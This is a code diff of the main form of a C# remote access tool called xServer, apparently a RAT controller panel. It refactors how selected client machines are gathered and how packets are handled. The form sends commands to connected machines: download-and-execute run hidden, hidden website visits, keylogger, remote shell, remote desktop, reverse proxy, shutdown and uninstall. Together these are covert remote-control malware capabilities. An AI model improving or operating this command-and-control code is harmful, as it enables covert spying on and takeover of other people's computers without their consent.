@@ -10,7 +10,6 @@ using xServer.Core.Extensions;
 using xServer.Core.Helper;
 using xServer.Core.Misc;
 using xServer.Core.Packets;
-using xServer.Core.ReverseProxy;
 using xServer.Settings;
 
 namespace xServer.Forms
@@ -20,6 +19,7 @@ namespace xServer.Forms
         public Server ListenServer;
         private readonly ListViewColumnSorter _lvwColumnSorter;
         public static volatile FrmMain Instance;
+        private bool _titleUpdateRunning;
 
         private void ReadSettings(bool writeIfNotExist = true)
         {
@@ -76,6 +76,8 @@ namespace xServer.Forms
 
         public void UpdateWindowTitle(int count, int selected)
         {
+            if (_titleUpdateRunning) return;
+            _titleUpdateRunning = true;
             try
             {
                 this.Invoke((MethodInvoker) delegate
@@ -97,6 +99,10 @@ namespace xServer.Forms
             }
             catch
             {
+            }
+            finally
+            {
+                _titleUpdateRunning = false;
             }
         }
 
@@ -218,88 +224,41 @@ namespace xServer.Forms
                 int selectedClients = 0;
                 this.Invoke((MethodInvoker) delegate
                 {
-                    foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>().Where(lvi => (Client)lvi.Tag == client))
+                    foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
+                        .Where(lvi => lvi != null && (lvi.Tag as Client) != null && (Client) lvi.Tag == client))
                     {
-                        lvi.Remove();
+                        try
+                        {
+                            lvi.Remove();
+                        }
+                        catch
+                        {
+                        }
                         server.ConnectedClients--;
                     }
                     selectedClients = lstClients.SelectedItems.Count;
                 });
-                UpdateWindowTitle(ListenServer.ConnectedClients, selectedClients);
+                UpdateWindowTitle(server.ConnectedClients, selectedClients);
             }
         }
 
         private void ClientRead(Server server, Client client, IPacket packet)
         {
-            var type = packet.GetType();
+            PacketHandler.HandlePacket(client, packet);
+        }
 
-            if (!client.Value.IsAuthenticated)
-            {
-                if (type == typeof (Core.Packets.ClientPackets.Initialize))
-                    CommandHandler.HandleInitialize(client, (Core.Packets.ClientPackets.Initialize) packet);
-                else
-                    return;
-            }
+        private Client[] GetSelectedClients()
+        {
+            List<Client> clients = new List<Client>();
 
-            if (type == typeof (Core.Packets.ClientPackets.Status))
+            if (lstClients.SelectedItems.Count == 0) return clients.ToArray();
+
+            lstClients.Invoke((MethodInvoker)delegate
             {
-                CommandHandler.HandleStatus(client, (Core.Packets.ClientPackets.Status) packet);
-            }
-            else if (type == typeof (Core.Packets.ClientPackets.UserStatus))
-            {
-                CommandHandler.HandleUserStatus(client, (Core.Packets.ClientPackets.UserStatus) packet);
-            }
-            else if (type == typeof (Core.Packets.ClientPackets.DesktopResponse))
-            {
-                CommandHandler.HandleRemoteDesktopResponse(client, (Core.Packets.ClientPackets.DesktopResponse) packet);
-            }
-            else if (type == typeof (Core.Packets.ClientPackets.GetProcessesResponse))
-            {
-                CommandHandler.HandleGetProcessesResponse(client,
-                    (Core.Packets.ClientPackets.GetProcessesResponse) packet);
-            }
-            else if (type == typeof (Core.Packets.ClientPackets.DrivesResponse))
-            {
-                CommandHandler.HandleDrivesResponse(client, (Core.Packets.ClientPackets.DrivesResponse) packet);
-            }
-            else if (type == typeof (Core.Packets.ClientPackets.DirectoryResponse))
-            {
-                CommandHandler.HandleDirectoryResponse(client, (Core.Packets.ClientPackets.DirectoryResponse) packet);
-            }
-            else if (type == typeof (Core.Packets.ClientPackets.DownloadFileResponse))
-            {
-                CommandHandler.HandleDownloadFileResponse(client,
-                    (Core.Packets.ClientPackets.DownloadFileResponse) packet);
-            }
-            else if (type == typeof (Core.Packets.ClientPackets.GetSystemInfoResponse))
-            {
-                CommandHandler.HandleGetSystemInfoResponse(client,
-                    (Core.Packets.ClientPackets.GetSystemInfoResponse) packet);
-            }
-            else if (type == typeof (Core.Packets.ClientPackets.MonitorsResponse))
-            {
-                CommandHandler.HandleMonitorsResponse(client, (Core.Packets.ClientPackets.MonitorsResponse) packet);
-            }
-            else if (type == typeof (Core.Packets.ClientPackets.ShellCommandResponse))
-            {
-                CommandHandler.HandleShellCommandResponse(client,
-                    (Core.Packets.ClientPackets.ShellCommandResponse) packet);
-            }
-            else if (type == typeof (Core.Packets.ClientPackets.GetStartupItemsResponse))
-            {
-                CommandHandler.HandleGetStartupItemsResponse(client, 
-                    (Core.Packets.ClientPackets.GetStartupItemsResponse) packet);
-            }
-            else if (type == typeof(Core.Packets.ClientPackets.GetLogsResponse))
-            {
-                CommandHandler.HandleGetLogsResponse(client, (Core.Packets.ClientPackets.GetLogsResponse) packet);
-            }
-            else if (type == typeof(Core.ReverseProxy.Packets.ReverseProxyConnectResponse) ||
-                    type == typeof(Core.ReverseProxy.Packets.ReverseProxyData) ||
-                    type == typeof(Core.ReverseProxy.Packets.ReverseProxyDisconnect))
-            {
-                ReverseProxyCommandHandler.HandleCommand(client, packet);
-            }
+                clients.AddRange(lstClients.SelectedItems.Cast<ListViewItem>().Where(lvi => lvi != null && (lvi.Tag as Client) != null).Select(lvi => (Client)lvi.Tag));
+            });
+
+            return clients.ToArray();
         }
 
         private void lstClients_ColumnClick(object sender, ColumnClickEventArgs e)
@@ -338,9 +297,8 @@ namespace xServer.Forms
                     {
                         if (Core.Misc.Update.UseDownload)
                         {
-                            foreach (ListViewItem lvi in lstClients.SelectedItems)
+                            foreach (Client c in GetSelectedClients())
                             {
-                                Client c = (Client)lvi.Tag;
                                 new Core.Packets.ServerPackets.Update(0, Core.Misc.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                             }
                         }
@@ -348,15 +306,8 @@ namespace xServer.Forms
                         {
                             new Thread(() =>
                             {
-                                List<Client> clients = new List<Client>();
-
-                                this.lstClients.Invoke((MethodInvoker) delegate
-                                {
-                                    clients.AddRange(from ListViewItem item in lstClients.SelectedItems select (Client)item.Tag);
-                                });
-
                                 bool error = false;
-                                foreach (Client c in clients)
+                                foreach (Client c in GetSelectedClients())
                                 {
                                     if (c == null) continue;
                                     if (error) continue;
@@ -398,18 +349,16 @@ namespace xServer.Forms
 
         private void ctxtDisconnect_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem lvi in lstClients.SelectedItems)
+            foreach (Client c in GetSelectedClients())
             {
-                Client c = (Client) lvi.Tag;
                 new Core.Packets.ServerPackets.Disconnect().Execute(c);
             }
         }
 
         private void ctxtReconnect_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem lvi in lstClients.SelectedItems)
+            foreach (Client c in GetSelectedClients())
             {
-                Client c = (Client) lvi.Tag;
                 new Core.Packets.ServerPackets.Reconnect().Execute(c);
             }
         }
@@ -424,9 +373,8 @@ namespace xServer.Forms
                         lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                     MessageBoxIcon.Question) == DialogResult.Yes)
             {
-                foreach (ListViewItem lvi in lstClients.SelectedItems)
+                foreach (Client c in GetSelectedClients())
                 {
-                    Client c = (Client) lvi.Tag;
                     new Core.Packets.ServerPackets.Uninstall().Execute(c);
                 }
             }
@@ -438,9 +386,8 @@ namespace xServer.Forms
 
         private void ctxtSystemInformation_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            foreach (Client c in GetSelectedClients())
             {
-                Client c = (Client) lstClients.SelectedItems[0].Tag;
                 if (c.Value.FrmSi != null)
                 {
                     c.Value.FrmSi.Focus();
@@ -453,9 +400,8 @@ namespace xServer.Forms
 
         private void ctxtFileManager_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            foreach (Client c in GetSelectedClients())
             {
-                Client c = (Client) lstClients.SelectedItems[0].Tag;
                 if (c.Value.FrmFm != null)
                 {
                     c.Value.FrmFm.Focus();
@@ -468,9 +414,8 @@ namespace xServer.Forms
 
         private void ctxtStartupManager_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            foreach (Client c in GetSelectedClients())
             {
-                Client c = (Client) lstClients.SelectedItems[0].Tag;
                 if (c.Value.FrmStm != null)
                 {
                     c.Value.FrmStm.Focus();
@@ -483,9 +428,8 @@ namespace xServer.Forms
 
         private void ctxtTaskManager_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            foreach (Client c in GetSelectedClients())
             {
-                Client c = (Client) lstClients.SelectedItems[0].Tag;
                 if (c.Value.FrmTm != null)
                 {
                     c.Value.FrmTm.Focus();
@@ -498,9 +442,8 @@ namespace xServer.Forms
 
         private void ctxtRemoteShell_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            foreach (Client c in GetSelectedClients())
             {
-                Client c = (Client) lstClients.SelectedItems[0].Tag;
                 if (c.Value.FrmRs != null)
                 {
                     c.Value.FrmRs.Focus();
@@ -513,9 +456,8 @@ namespace xServer.Forms
 
         private void ctxtReverseProxy_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            foreach (Client c in GetSelectedClients())
             {
-                Client c = (Client) lstClients.SelectedItems[0].Tag;
                 if (c.Value.FrmProxy != null)
                 {
                     c.Value.FrmProxy.Focus();
@@ -527,66 +469,32 @@ namespace xServer.Forms
             }
         }
 
-        private Client[] GetSelectedClients()
-        {
-            List<Client> clients = new List<Client>();
-
-            for (int i = 0; i < lstClients.SelectedItems.Count; i++)
-            {
-                clients.Add((Client) lstClients.SelectedItems[i].Tag);
-            }
-            return clients.ToArray();
-        }
-
         private void ctxtRegistryEditor_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
-            {
-                // TODO
-                //Client c = (Client)lstClients.SelectedItems[0].Tag;
-                //if (c.Value.FrmReg != null)
-                //{
-                //    c.Value.FrmReg.Focus();
-                //    return;
-                //}
-                //FrmStartupManager FrmReg = new FrmStartupManager(c);
-                //FrmReg.Show();
-            }
+            // TODO
         }
 
         private void ctxtShutdown_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            foreach (Client c in GetSelectedClients())
             {
-                foreach (ListViewItem lvi in lstClients.SelectedItems)
-                {
-                    Client c = (Client) lvi.Tag;
-                    new Core.Packets.ServerPackets.Action(0).Execute(c);
-                }
+                new Core.Packets.ServerPackets.Action(0).Execute(c);
             }
         }
 
         private void ctxtRestart_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            foreach (Client c in GetSelectedClients())
             {
-                foreach (ListViewItem lvi in lstClients.SelectedItems)
-                {
-                    Client c = (Client) lvi.Tag;
-                    new Core.Packets.ServerPackets.Action(1).Execute(c);
-                }
+                new Core.Packets.ServerPackets.Action(1).Execute(c);
             }
         }
 
         private void ctxtStandby_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            foreach (Client c in GetSelectedClients())
             {
-                foreach (ListViewItem lvi in lstClients.SelectedItems)
-                {
-                    Client c = (Client) lvi.Tag;
-                    new Core.Packets.ServerPackets.Action(2).Execute(c);
-                }
+                new Core.Packets.ServerPackets.Action(2).Execute(c);
             }
         }
 
@@ -596,9 +504,8 @@ namespace xServer.Forms
 
         private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            foreach (Client c in GetSelectedClients())
             {
-                Client c = (Client) lstClients.SelectedItems[0].Tag;
                 if (c.Value.FrmRdp != null)
                 {
                     c.Value.FrmRdp.Focus();
@@ -611,17 +518,13 @@ namespace xServer.Forms
 
         private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
-            {
-                // TODO
-            }
+            // TODO
         }
 
         private void ctxtKeylogger_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            foreach (Client c in GetSelectedClients())
             {
-                Client c = (Client)lstClients.SelectedItems[0].Tag;
                 if (c.Value.FrmKl != null)
                 {
                     c.Value.FrmKl.Focus();
@@ -646,15 +549,8 @@ namespace xServer.Forms
                     {
                         new Thread(() =>
                         {
-                            List<Client> clients = new List<Client>();
-
-                            this.lstClients.Invoke((MethodInvoker)delegate
-                            {
-                                clients.AddRange(from ListViewItem item in lstClients.SelectedItems select (Client)item.Tag);
-                            });
-
                             bool error = false;
-                            foreach (Client c in clients)
+                            foreach (Client c in GetSelectedClients())
                             {
                                 if (c == null) continue;
                                 if (error) continue;
@@ -702,9 +598,8 @@ namespace xServer.Forms
                 {
                     if (frm.ShowDialog() == DialogResult.OK)
                     {
-                        foreach (ListViewItem lvi in lstClients.SelectedItems)
+                        foreach (Client c in GetSelectedClients())
                         {
-                            Client c = (Client) lvi.Tag;
                             new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL,
                                 DownloadAndExecute.RunHidden).Execute(c);
                         }
@@ -721,9 +616,8 @@ namespace xServer.Forms
                 {
                     if (frm.ShowDialog() == DialogResult.OK)
                     {
-                        foreach (ListViewItem lvi in lstClients.SelectedItems)
+                        foreach (Client c in GetSelectedClients())
                         {
-                            Client c = (Client) lvi.Tag;
                             new Core.Packets.ServerPackets.VisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
                         }
                     }
@@ -735,14 +629,17 @@ namespace xServer.Forms
         {
             if (lstClients.SelectedItems.Count != 0)
             {
-                Client c = (Client) lstClients.SelectedItems[0].Tag;
-                if (c.Value.FrmSm != null)
+                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                 {
-                    c.Value.FrmSm.Focus();
-                    return;
+                    if (frm.ShowDialog() == DialogResult.OK)
+                    {
+                        foreach (Client c in GetSelectedClients())
+                        {
+                            new Core.Packets.ServerPackets.ShowMessageBox(
+                                MessageBoxData.Caption, MessageBoxData.Text, MessageBoxData.Button, MessageBoxData.Icon).Execute(c);
+                        }
+                    }
                 }
-                FrmShowMessagebox frmSM = new FrmShowMessagebox(c);
-                frmSM.Show();
             }
         }
 
